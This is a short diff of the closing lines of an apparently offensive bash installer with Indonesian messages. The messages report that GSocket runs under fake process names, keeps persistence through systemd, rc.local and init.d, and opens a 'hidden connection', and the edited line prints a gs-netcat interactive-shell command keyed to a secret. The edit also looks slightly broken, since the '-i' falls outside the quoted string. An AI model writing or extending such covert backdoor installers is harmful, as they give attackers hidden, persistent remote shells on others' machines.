@@ -164,6 +164,6 @@ echo "[+] Instalasi selesai!"
 echo "[+] GSocket berjalan dengan nama proses palsu:"
 printf "[+] %s\n" "${PROCESS_NAMES[@]}"
 echo "[+] Binary tersimpan di: $GS_NETCAT"
-echo "[+] Koneksi tersembunyi ke: $GSOCKET_SECRET"
+echo "[+] Koneksi tersembunyi ke: gs-netcat -s $GSOCKET_SECRET" -i
 echo "[+] Persistence: systemd, rc.local, init.d"
 echo "=========================================="
